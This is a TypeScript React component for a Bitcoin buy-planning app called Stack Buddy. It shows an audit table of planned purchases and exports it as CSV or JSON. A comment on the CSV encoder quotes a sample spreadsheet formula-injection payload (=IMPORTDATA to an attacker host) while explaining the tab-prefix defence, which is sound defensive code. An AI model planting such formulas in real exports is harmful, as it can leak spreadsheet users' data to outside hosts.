import { useEffect, useMemo, useState } from 'react';
import { formatUSD } from '../../../shared/math/format.js';
import type { PlanState, PlanStrategyKind } from '../../../shared/types.js';
import type { PlanProjectionResult } from '../lib/planProjection.js';

const APP_VERSION = '0.1.0';

export function PlanAuditPanel(props: {
  projection: PlanProjectionResult;
  plan: PlanState;
  selectedKind: PlanStrategyKind | null;
  openRequestId: number;
}) {
  const [open, setOpen] = useState(false);
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    if (props.openRequestId > 0) setOpen(true);
  }, [props.openRequestId]);

  const packet = useMemo(() => buildAuditPacket(props), [props]);
  const rows = props.projection.audit.auditRows;
  const rec = props.projection.reconciliation;

  const downloadCsv = () => {
    downloadText('stack-buddy-audit.csv', auditRowsToCsv(rows), 'text/csv;charset=utf-8');
  };

  const downloadJson = () => {
    downloadText(
      'stack-buddy-plan.json',
      JSON.stringify(packet, null, 2),
      'application/json;charset=utf-8',
    );
  };

  const copyPacket = async () => {
    await navigator.clipboard.writeText(JSON.stringify(packet, null, 2));
    setCopied(true);
    window.setTimeout(() => setCopied(false), 1800);
  };

  return (
    <details
      id="every-buy-panel"
      open={open}
      onToggle={(e) => setOpen((e.currentTarget as HTMLDetailsElement).open)}
      className="rounded-2xl border border-cream-300 bg-white p-7"
    >
      <summary className="cursor-pointer list-none rounded-xl focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-btc-orange/35">
        <div className="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
          <div>
            <div className="mb-1 text-base font-bold uppercase tracking-[0.06em] text-text-muted">
              Every buy
            </div>
            <div className="text-lg font-semibold text-text-primary">
              {rows.length} buys · {props.projection.btcAtDeadline.toFixed(4)} BTC at deadline
            </div>
            <div className="mt-3 inline-flex items-center gap-2 rounded-lg border border-cream-300 bg-cream-50 px-3 py-2 text-base font-semibold text-btc-orange-end hover:border-btc-orange hover:bg-[#fffaf5]">
              {open ? 'Hide the buy schedule' : 'Show every buy in this plan'}
              <span aria-hidden="true">{open ? '↑' : '↓'}</span>
            </div>
            <p className="mt-2 text-base leading-relaxed text-text-secondary">
              Date, price used, dollars deployed, and BTC bought — for every buy in the plan.
            </p>
          </div>
          <div className="flex flex-wrap gap-2">
            <button
              type="button"
              onClick={(e) => {
                e.preventDefault();
                downloadCsv();
              }}
              className="rounded-lg border border-cream-300 bg-white px-3 py-2 text-base font-medium text-text-primary hover:border-btc-orange hover:text-btc-orange-end"
            >
              Download as CSV
            </button>
            <button
              type="button"
              onClick={(e) => {
                e.preventDefault();
                downloadJson();
              }}
              className="rounded-lg border border-cream-300 bg-white px-3 py-2 text-base font-medium text-text-primary hover:border-btc-orange hover:text-btc-orange-end"
            >
              Export as JSON
            </button>
            <button
              type="button"
              onClick={(e) => {
                e.preventDefault();
                void copyPacket();
              }}
              className="rounded-lg border border-cream-300 bg-white px-3 py-2 text-base font-medium text-text-primary hover:border-btc-orange hover:text-btc-orange-end"
            >
              {copied ? 'Copied' : 'Copy this plan'}
            </button>
          </div>
        </div>
      </summary>

      {!rec.ok && (
        <div className="mt-5 rounded-xl border border-error/40 bg-[#fbe9e6] px-4 py-3 text-base text-error">
          Plan display is out of sync with deterministic engine. Recalculate.
          <ul className="mt-2 list-disc pl-5 text-base">
            {rec.issues.map((issue) => (
              <li key={issue}>{issue}</li>
            ))}
          </ul>
        </div>
      )}

      <div className="mt-5 grid grid-cols-1 gap-4 border-y border-cream-200 py-4 sm:grid-cols-3">
        <AuditStat label="Total deployed" value={formatUSD(props.projection.totalDollarsDeployed)} />
        <AuditStat label="Effective buy price" value={formatUSD(props.projection.audit.totals.effective_average_buy_price)} />
        <AuditStat label="Final BTC price" value={formatUSD(props.projection.audit.totals.final_btc_price)} />
      </div>

      <div className="mt-5 overflow-x-auto">
        <table className="min-w-[1280px] border-collapse text-base">
          <thead>
            <tr className="border-b border-cream-300 text-left text-text-muted">
              <Th>#</Th>
              <Th>Date</Th>
              <Th>Type</Th>
              <Th>Label</Th>
              <Th>USD amount</Th>
              <Th>BTC price used</Th>
              <Th>Power Law 1.0x</Th>
              <Th>Multiplier</Th>
              <Th>BTC bought</Th>
              <Th>Cumulative BTC</Th>
              <Th>Cumulative deployed</Th>
              <Th>Fiat value</Th>
              <Th>Notes</Th>
            </tr>
          </thead>
          <tbody>
            {rows.map((row) => (
              <tr key={`${row.row_number}-${row.date_iso}-${row.label}`} className="border-b border-cream-200 last:border-0">
                <Td>{row.row_number}</Td>
                <Td>{row.date_iso}</Td>
                <Td>{row.contribution_type.replace('_', ' ')}</Td>
                <Td>{row.label}</Td>
                <Td>{formatUSD(row.amount_usd)}</Td>
                <Td>{formatUSD(row.btc_price_used)}</Td>
                <Td>{formatUSD(row.power_law_price)}</Td>
                <Td>{row.multiplier.toFixed(4)}x</Td>
                <Td>{row.btc_bought.toFixed(8)}</Td>
                <Td>{row.cumulative_btc.toFixed(8)}</Td>
                <Td>{formatUSD(row.cumulative_deployed)}</Td>
                <Td>{formatUSD(row.fiat_value)}</Td>
                <Td>{row.notes}</Td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </details>
  );
}

function buildAuditPacket(props: {
  projection: PlanProjectionResult;
  plan: PlanState;
  selectedKind: PlanStrategyKind | null;
}) {
  // 3 Approaches is intentionally disconnected from the Simple tab's cash
  // flow. The packet is the *plan* — goal, model, schedule, every buy. Cash-
  // flow context (income, burn, savings) lives on the Simple tab and the
  // user can describe it directly to the AI in their own words if relevant.
  const p = props.projection;

  return {
    app: 'Stack Buddy',
    version: APP_VERSION,
    model: {
      type: 'catch_up_power_law',
      powerLawFormula: 'Price = 10^(-1.847796462) * (yearsSinceGenesis)^5.616314045',
      genesisDate: '2009-01-03',
      spotAnchorDate: p.audit.model.spot_anchor_date,
      spotAnchorPrice: p.audit.model.spot_anchor_price,
      catchupDate: p.audit.model.catchup_date,
      catchupPrice: p.audit.model.catchup_price,
      postCatchup: 'b1m_1x',
    },
    goal: {
      // The calculator is intentionally OPSEC-conservative: it never asks
      // how much BTC the user already holds. `additionalBtcToBuy` is the
      // delta the calculator solved for. If the user already holds some,
      // they subtracted it before typing this number in.
      additionalBtcToBuy: props.plan.goal.target_btc,
      deadline: props.plan.goal.deadline,
    },
    plan: {
      type: props.selectedKind ?? props.plan.recurring.shape,
      totalDeployed: p.totalDollarsDeployed,
      btcAtDeadline: p.btcAtDeadline,
      fiatValueAtDeadline: p.netWorthAtDeadline,
    },
    auditRows: p.audit.auditRows,
  };
}

export function auditRowsToCsv(rows: PlanProjectionResult['audit']['auditRows']): string {
  const fields = [
    'date_iso',
    'contribution_type',
    'label',
    'amount_usd',
    'btc_price_used',
    'power_law_price',
    'multiplier',
    'btc_bought',
    'cumulative_btc',
    'cumulative_deployed',
    'fiat_value',
    'model_id',
    'spot_anchor_date',
    'spot_anchor_price',
    'catchup_date',
    'catchup_price',
  ] as const;
  const lines = [
    fields.join(','),
    ...rows.map((row) =>
      fields
        .map((field) => csvCell(String(row[field])))
        .join(','),
    ),
  ];
  return `${lines.join('\n')}\n`;
}

function downloadText(filename: string, text: string, type: string) {
  const blob = new Blob([text], { type });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}

/**
 * CSV cell encoder with formula-injection defense.
 *
 * Excel, Google Sheets, and Numbers all treat a cell starting with one of
 * `= + - @ \t \r` as a formula. A user-typed lump label like
 * `=IMPORTDATA("https://attacker.example.com/x")` would execute on open
 * unless we defang it. OWASP's standard mitigation is to prefix any such
 * cell with a single TAB character, which spreadsheet apps render as
 * leading whitespace and refuse to evaluate as a formula.
 *
 * Order matters: defang the value first, THEN apply standard CSV quoting.
 * That way the leading TAB survives inside a quoted field and any embedded
 * quotes/commas/newlines still get the right escape treatment.
 */
export function csvCell(value: string): string {
  const defanged = /^[=+\-@\t\r]/.test(value) ? `\t${value}` : value;
  if (!/[",\n\r\t]/.test(defanged)) return defanged;
  return `"${defanged.replace(/"/g, '""')}"`;
}

function AuditStat(props: { label: string; value: string }) {
  return (
    <div>
      <div className="text-base text-text-muted">{props.label}</div>
      <div className="text-xl font-bold tabular-nums text-text-primary">{props.value}</div>
    </div>
  );
}

function Th(props: { children: React.ReactNode }) {
  return <th className="px-3 py-2 font-semibold">{props.children}</th>;
}

function Td(props: { children: React.ReactNode }) {
  return <td className="px-3 py-2 align-top text-text-secondary">{props.children}</td>;
}
